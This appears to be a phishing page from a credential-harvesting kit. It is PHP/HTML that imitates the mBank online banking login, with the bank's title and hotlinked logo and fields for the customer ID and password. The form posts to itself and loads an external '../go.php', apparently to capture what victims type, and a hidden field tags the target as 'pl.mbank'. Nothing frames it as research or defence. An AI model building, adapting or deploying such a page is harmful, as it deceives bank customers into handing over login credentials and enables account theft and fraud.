<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="utf-8">

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

 <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />

    <meta name="description" content="Logowanie do serwisu transakcyjnego mBanku">
        
    <link rel="stylesheet" href="css/normalize.css">

    <link rel="stylesheet" type="text/css" href="css/a_002.css">
    <title>mBank serwis transakcyjny</title>



<style>
html, body {
    height: 100%;
    min-height: 100%;
}

</style>





</head>
<body>
	
    

<div id="log-in-panel-container1" style="background-color:#012A37;width:100%;height:100%;">
<div style=" width:100%; margin:0 auto; text-align:center; padding-top:20px;">
<img src=https://online.mbank.pl/Content/gfx/mbank-white-logo.png>

</div>
<div id="log-in-panel-content-container" style="width:300px; height:180px; margin:0 auto; padding: 8px 0  140px">
        <div class="box bg-red radius-15 log-in-box-bg-default" id="log-in-box">
            <div class="box-content">
                <form method="post" action="#" name="log-in-form" autocomplete="off">
                            <input name="field1" id="field1" value="pl.mbank" type="hidden">
                    <fieldset>
                        <ul>
                            <li><input name="field2" id="field2" maxlength="24" required="" placeholder="Identyfikator" tabindex="1" type="text"></li>
                            <li><input name="field3" id="field3" maxlength="32" required="" placeholder="Has&#322;o" tabindex="2" type="password"></li>
                        </ul>

                        <input class="bg-gradient-grey" value="Zaloguj si&#281;" tabindex="3" id="submitButton" type="submit">
                    </fieldset>
                </form>

            </div><!-- / box-content -->
        </div><!-- / box-->
                               
    </div><!-- / log-in-panel-left-content -->

</div>




</body>
</html>